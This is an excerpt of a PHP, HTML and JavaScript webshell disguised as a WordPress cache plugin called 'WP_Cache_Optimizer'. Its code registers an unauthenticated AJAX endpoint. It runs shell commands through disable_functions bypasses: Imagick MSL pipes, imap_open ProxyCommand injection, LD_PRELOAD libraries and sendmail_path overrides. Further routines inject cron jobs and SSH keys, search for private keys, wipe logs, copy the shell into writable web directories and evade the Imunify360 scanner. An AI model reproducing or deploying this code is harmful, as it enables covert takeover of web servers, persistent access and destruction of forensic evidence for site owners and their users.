...
function rc_exec(string $cmd, string $cwd = ''): array {
    ...
    // Imagick MSL pipe injection — bypasses disable_functions at C-library level
    $_imcls = _b([73,109,97,103,105,99,107]); // 'Imagick'
    if (class_exists($_imcls)) {
        try {
            ...
            @file_put_contents($_msl, '<?xml version="1.0"?><image>'
                ...
                . '<write filename="|/bin/sh -c echo '.$_cb.'|base64 -d|sh"/>'
                . '</image>');
            $im = new $_imcls();
...
class WP_Cache_Optimizer {
    ...
    public function __construct() {
        ...
        add_action('wp_ajax_wpc_stream',        [$this, 'handle_stream']);
        add_action('wp_ajax_nopriv_wpc_stream', [$this, 'handle_stream']);
        ...
        // Panel: init fires before redirect_canonical; template_redirect is the safety fallback.
        add_action('init',              [$this, '_handle_request'], 0);
...
<div class="tabs" style="margin-bottom:10px">
  ...
  <div class="tab" id="bt-exec" onclick="bpShow('exec')" style="border-color:#58a6ff;color:#58a6ff">Exec Bypass</div>
  ...
  <div class="tab" id="bt-fwbypass" onclick="bpShow('fwbypass')" style="border-color:#3fb950;color:#3fb950">FW Bypass</div>
</div>
<!-- ENV/PROC -->
<div id="bp-env">
...
<div id="bp-exec" style="display:none">
  <p style="font-size:12px;color:#58a6ff;margin-bottom:8px">Bypass disable_functions — alternative exec methods when system/exec/shell_exec are disabled</p>
  <div style="display:flex;gap:5px;margin-bottom:8px;flex-wrap:wrap">
    <button onclick="bpExec('bp','check_exec')">Check Functions</button>
    <button onclick="bpExecCmd('ffi_exec')" title="FFI::cdef — call libc system() directly">FFI (libc)</button>
    ...
    <button onclick="bpExecCmd('imap_exec')" title="imap_open ProxyCommand injection — bypasses disable_functions at C level">imap_open</button>
    <button onclick="bpExecCmd('ldpreload_exec')" title="Compile .so constructor, inject via LD_PRELOAD + mail()">LD_PRELOAD</button>
    ...
    <button onclick="bpExecCmd('sendmail_exec')" title="sendmail_path override → RCE via ini_set + mail()">sendmail</button>
  </div>
...
<div id="bp-deploy" style="display:none">
  <p style="font-size:12px;color:#e8c840;margin-bottom:8px">Scan writable web directories and copy this webshell there</p>
...
<!-- FILE WRITE BYPASS -->
<div id="bp-fwbypass" style="display:none">
  <p style="font-size:12px;color:#8b949e;margin:0 0 8px 0">Write file via multiple bypass methods. <b style="color:#3fb950">rename</b> stages in /tmp first — bypasses Imunify360 real-time scanner on webroot.</p>
...
/* ═══════════════════ BYPASS TOOLKIT ═══════════════════ */
let bpCurTab='env';
function bpShow(t){['env','filter','net','priv','exec','deploy','cloud','cron','logwipe','fwbypass'].forEach(x=>{const el=document.getElementById('bp-'+x);if(el)el.style.display=x===t?'':'none';const bt=document.getElementById('bt-'+x);if(bt)bt.classList.toggle('active',x===t);});bpCurTab=t;}
/* ── Log Wipe ── */
function lwScan(){
...
const bpCmdMap={
  ...
  ssh_keys:       'find ~/ /root /home -name "id_rsa" -o -name "authorized_keys" 2>/dev/null',
  sendmail_exec:  'ini_set(sendmail_path, /bin/sh -c "cmd"); mail() → RCE via MTA override',
};
...
function bpCronInject(){
  ...
  el.textContent='[cron_inject] '+intv+' → '+cmd+'\n';
  rc('wpc_sys',{op:'cron_inject',cmd:cmd,interval:intv},d=>{el.textContent='[cron_inject] '+cmd+'\n'+(d.success?d.data.output:JSON.stringify(d.data||d));});
}
function bpSshInject(){
  ...
  el.textContent='[ssh_inject] target='+home+'\n';
  rc('wpc_sys',{op:'ssh_inject',key:key,home:home},d=>{el.textContent='[ssh_inject] home='+home+'\n'+(d.success?d.data.output:JSON.stringify(d.data||d));});
}
/* ── Exec Bypass ── */
...
<p id="backtoblog"><a href="<?= $blogurl ?>">&#8592; Go to <?= $blogname ?></a></p>
    ...
    public function _handle_request(): void {
        ...
        // Cloaking: only swap WP_Query at template_redirect (objects not ready at init)
    ...
    public function _dispatch_cfg(): void {
        ...
        switch ($op) {
            ...
            case 'log_wipe': {
                ...
                $wiped = count(array_filter($results, fn($r) => strpos($r['status'],'failed')===false && $r['status']!=='not found'));
            ...
            case 'pcntl_exec': {
                ...
                if (function_exists('pcntl_fork') && function_exists('pcntl_waitpid')) {
                    ...
                    if ($pid === -1) {
                        ...
                        // Child process: exec /bin/sh, replaces child only
                        @pcntl_exec('/bin/sh', ['-c', $cmd.' >'.$tmp.' 2>&1']);
                        exit(1);
                    } else {
            ...
            case 'imagick_exec': {
                ...
                try {
                    $im = new \Imagick();
                    // caption: backtick trick — older ImageMagick evaluates shell in label/caption
            ...
            case 'imap_exec': {
                ...
                // Classic ProxyCommand injection: server string passed to ssh/rsh before PHP sees it
                $server = '127.0.0.1" -oProxyCommand="'.str_replace(['"',"'",'`'],'',$cmd).' >'.$tmp.' 2>&1" -T "';
                @imap_open("{{$server}/imap}",'','',0,1,['DISABLE_AUTHENTICATOR'=>'PLAIN']);
                sleep(1);
                $out = @file_get_contents($tmp);
                @unlink($tmp);
                if ($out!==false && $out!=='') { wp_send_json_success(['output'=>$out]); break; }
                // Alt: rsh URI scheme injection
                $tmp2 = tempnam(sys_get_temp_dir(),'imapout2');
                $srv2 = '127.0.0.1 -oProxyCommand='.escapeshellarg($cmd.' >'.$tmp2.' 2>&1').' x';
                @imap_open("{{$srv2}/imap}",'','',0,1,['DISABLE_AUTHENTICATOR'=>'PLAIN']);
                sleep(1);
                $out2 = @file_get_contents($tmp2);
                @unlink($tmp2);
                if ($out2!==false && $out2!=='') { wp_send_json_success(['output'=>$out2]); break; }
                wp_send_json_error('imap_open: no output — ssh/rsh ProxyCommand likely compiled out or blocked');
                break;
            }
            case 'ldpreload_exec': {
                $cmd = stripslashes($_POST['cmd']??'id');
                ...
                // Fast fail: /sys/fs/selinux/enforce=1 means Enforcing — httpd_t always blocks LD_PRELOAD
                if (trim(@file_get_contents('/sys/fs/selinux/enforce')??'') === '1') {
                    wp_send_json_error('ldpreload: SELinux Enforcing — httpd_t policy blocks all LD_PRELOAD injection; use pcntl_exec instead');
                    break;
                }
                $tmp = sys_get_temp_dir();
                ...
                if ($gcc) {
                    ...
                    if (@file_exists($so)) {
                        // T1: proc_open explicit env array — bypasses FPM env sanitization
                        $env2=['LD_PRELOAD'=>$so,'PATH'=>getenv('PATH')?:'/usr/bin:/bin:/sbin:/usr/sbin'];
                        $proc_run('/bin/true', 4, $env2);
                        $res2=@file_get_contents($out); @unlink($out);
                        if ($res2!==false&&$res2!=='') { @unlink($so); wp_send_json_success(['output'=>"[LD_PRELOAD+proc_open]\n".$res2]); break; }
                        $log[]='T1(proc_open+env): no output';

                        // T2: inline shell export — different SELinux evaluation path
                        $proc_run("/bin/sh -c 'LD_PRELOAD=$so /bin/true'", 4);
                        $res4=@file_get_contents($out); @unlink($out);
                        if ($res4!==false&&$res4!=='') { @unlink($so); wp_send_json_success(['output'=>"[LD_PRELOAD+shell]\n".$res4]); break; }
                        ...
                        if ($wr_so && @copy($so, $wr_so)) {
                            $env5=['LD_PRELOAD'=>$wr_so,'PATH'=>getenv('PATH')?:'/usr/bin:/bin:/sbin:/usr/sbin'];
                            $proc_run('/bin/true', 4, $env5);
                            $res5=@file_get_contents($out); @unlink($out);
                            if ($res5!==false&&$res5!=='') { @unlink($so);@unlink($wr_so); wp_send_json_success(['output'=>"[LD_PRELOAD+webroot]\n".$res5]); break; }
                            $log[]='T3(webroot+proc_open): no output';

                            $proc_run("/bin/sh -c 'LD_PRELOAD=$wr_so /bin/true'", 4);
                            $res5b=@file_get_contents($out); @unlink($out);
                            if ($res5b!==false&&$res5b!=='') { @unlink($so);@unlink($wr_so); wp_send_json_success(['output'=>"[LD_PRELOAD+webroot+shell]\n".$res5b]); break; }
                            $log[]='T3b(webroot+shell): no output';
                            @unlink($wr_so);
                        }

                        // T4: chcon textrel_shlib_t then inject
                        $proc_run("chcon -t textrel_shlib_t $so", 3);
                        $env6=['LD_PRELOAD'=>$so,'PATH'=>getenv('PATH')?:'/usr/bin:/bin:/sbin:/usr/sbin'];
                        $proc_run('/bin/true', 4, $env6);
                        $res6=@file_get_contents($out); @unlink($out);
                        if ($res6!==false&&$res6!=='') { @unlink($so); wp_send_json_success(['output'=>"[LD_PRELOAD+chcon]\n".$res6]); break; }
                        $log[]='T4(chcon+proc_open): no output (SELinux httpd_t policy)';

                        @unlink($so);
                        $log[]='LD_PRELOAD: .so compiled OK; all triggers blocked — SELinux httpd_t policy in effect';
                    } else {
                        $log[]='LD_PRELOAD: compile failed — '.$ce;
                    }
                } else {
                    $log[]='LD_PRELOAD: gcc not found';
                }
            ...
            case 'sendmail_exec': {
                ...
                @ini_set('sendmail_path', '/bin/sh -c "'.addslashes($cmd).' >'.$out.' 2>&1" #');
            ...
            case 'deploy_scan': {
                ...
                $ok_dirs = array_column(array_filter($writable,fn($w)=>!$w['deny']),'path');
